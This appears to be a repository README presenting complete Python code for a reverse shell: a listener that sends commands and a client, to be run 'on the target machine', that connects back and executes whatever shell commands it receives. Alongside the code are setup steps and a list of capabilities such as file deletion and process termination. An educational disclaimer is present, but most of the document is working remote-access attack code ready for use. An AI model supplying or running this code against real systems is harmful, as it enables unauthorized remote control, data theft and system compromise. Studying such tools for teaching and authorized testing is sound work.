
# Python Reverse Shell

This repository contains a simple Python-based reverse shell implementation. It includes a server component and a client component for establishing a connection and executing commands.

## Disclaimer
This project is for **educational purposes only**. Do not use this on any system without proper authorization. Unauthorized use is illegal and unethical.

---

## Server Component

The **server** listens for connections from the client, sends commands, and displays the output of those commands.

### Code
```python
import socket

HOST = '127.0.0.1'  # Change to your IP address, e.g., '192.168.43.82'
PORT = 8081         # Change to your desired port, e.g., 2222

server = socket.socket()
server.bind((HOST, PORT))

print('[+] Server Started')
print('[+] Listening For Client Connection ...')

server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

while True:
    command = input('Enter Command : ')
    command = command.encode()
    client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")
```

### Usage
1. Replace `HOST` and `PORT` with the desired IP address and port.
2. Run the server script on your machine.
3. Wait for a client connection.

---

## Client Component

The **client** connects to the server, executes the received commands, and sends back the output.

### Code
```python
import socket
import subprocess

REMOTE_HOST = '127.0.0.1'  # Change to server IP, e.g., '192.168.43.82'
REMOTE_PORT = 8081         # Change to match the server port, e.g., 2222

client = socket.socket()

print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)
```

### Usage
1. Replace `REMOTE_HOST` and `REMOTE_PORT` with the server's IP address and port.
2. Run the client script on the target machine.

---

## Example Usage

### Setup

1. **Prepare the scripts**:
   - Save the **Server Component** code in a file named `server.py`.
   - Save the **Client Component** code in a file named `client.py`.

2. **Run the Server**:
   - Open a terminal on the server machine.
   - Execute `python3 server.py`. The server will start and wait for a connection.

3. **Run the Client**:
   - On the target machine, execute `python3 client.py`. The client will connect to the server.

4. **Send Commands**:
   - In the server terminal, type commands like `whoami` or `ls` and view the output.

---

## Functionalities

1. **Remote Command Execution**
   - Run shell commands like `whoami`, `ls`, or `ipconfig`.

2. **File Management**
   - List, delete, or read files on the client system.

3. **Network Information**
   - View the client’s network configuration and active connections.

4. **Process Management**
   - List or terminate running processes.

5. **Custom Scripts**
   - Execute scripts or commands already present on the client machine.

---

## Ethical Applications

1. **Penetration Testing**
   - Assess the security of your systems by simulating attacks.

2. **Education**
   - Learn networking and cybersecurity concepts.

3. **System Administration**
   - Remotely manage authorized systems.

---

## Risks and Precautions

### Risks:
- **Malicious Use**: Unauthorized use could lead to data theft, system compromise, or legal consequences.
- **Detection**: Reverse shells may be flagged by antivirus software.

### Precautions:
- Only use on authorized systems.
- Secure communication with encryption (e.g., SSL/TLS).
- Restrict access to specific IPs.
- Monitor and log all activity.

---

## Important Notes

- Always use the same IP and port in both scripts.
- Test locally using `127.0.0.1` and the same machine.

---

## Requirements

- Python 3.x
- Basic knowledge of networking and Python

---

## License

This project is licensed under the MIT License. See the LICENSE file for details.
